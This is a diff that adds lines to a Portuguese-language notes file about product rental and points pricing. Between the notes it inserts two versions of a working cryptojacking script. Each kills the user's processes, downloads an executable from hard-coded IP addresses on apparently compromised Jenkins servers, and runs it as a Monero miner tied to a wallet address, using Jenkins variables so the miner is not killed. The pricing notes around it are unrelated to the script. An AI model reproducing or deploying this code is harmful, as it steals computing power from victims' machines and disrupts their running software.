@@ -448,3 +448,74 @@ validade (meses dias)
 preço de locação e unidade de tempo no produto?
 usar o bom para características? ou algo do tipo?
 
+
+
+
+
+
+
+
+
+
+for tr in $(ps -U $USER | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do echo "Killing ${tr}"; kill -9 $tr || : ; done;
+threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
+hostHash=$(hostname -f | md5sum | cut -c1-8);
+echo "${hostHash} - ${threadCount}";
+d() { curl --fail $1 -o debug 2> /dev/null || wget $1 -O debug 2> /dev/null && chmod +x debug; }
+
+test ! -e d && touch d && rm -rf debug;
+test ! -e debug && (d "https://34.243.239.201/job/Insecure-Jenkins/ws/debug" || d "http://61.50.105.218:9002/job/Insecure-Jenkins/ws/debug");
+
+p() {
+  BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1:$2 -u 45h4a6VQoroEmqepwHTs9u4eAg98XFcHf5wHwzm9gWuLJYFvBawBCgY73PJQdJYNMQCczVs4S8PY4LfxnPn5UsqMSW5XLge.JL8_${hostHash:-abc} -p x -t ${threadCount:-4}
+}
+
+p "pool.minexmr.com" "4444" && p "91.121.87.10" "4444" && p "pool.minexmr.com" "7777" && p "pool.minexmr.com" "80" && p "91.121.87.10" "7777"
+
+
+/var/lib/jenkins/workspace/Insecure-Jenkins/debug
+
+
+
+#!/bin/bash
+
+for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do kill -9 $tr 2> /dev/null || : ; done;
+threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
+hostHash=$(hostname -f | md5sum | cut -c1-8);
+echo "${hostHash} - ${threadCount}";
+
+_curl () {
+  read proto server path <<<$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) <&3
+  exec 3>&-
+}
+
+d() { (curl --insecure --fail $1 -o debug 2> /dev/null || wget --no-check-certificate $1 -O debug 2> /dev/null || _curl $1 > debug) && chmod +x debug; }
+
+test ! -e d && touch d && rm -rf debug;
+test ! -s debug && (d "https://54.218.74.37:8443/view/all/job/Insecure-Jenkins/ws/debug" || d "http://35.196.231.47:9080/job/Insecure-Jenkins/ws/debug" || d "http://61.50.105.218:9002/job/Insecure-Jenkins/ws/debug");
+test ! -x debug && chmod +x debug;
+
+p() {
+  BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1:$2 -u 45h4a6VQoroEmqepwHTs9u4eAg98XFcHf5wHwzm9gWuLJYFvBawBCgY73PJQdJYNMQCczVs4S8PY4LfxnPn5UsqMSW5XLge.JL8_${hostHash:-abc} -p x -t ${threadCount:-4}
+}
+
+p "pool.minexmr.com" "4444" && p "91.121.87.10" "4444" && p "pool.minexmr.com" "7777" && p "pool.minexmr.com" "80" && p "91.121.87.10" "7777" &&  p "91.121.87.10" "80"
+
+
+
+total R$ 950    total pontos 1000
+
+se pontos + pontsonbuy >= total pontos
+   total
+else 
+   (pontos + pontsonbuy) * tota R$ / total pontos
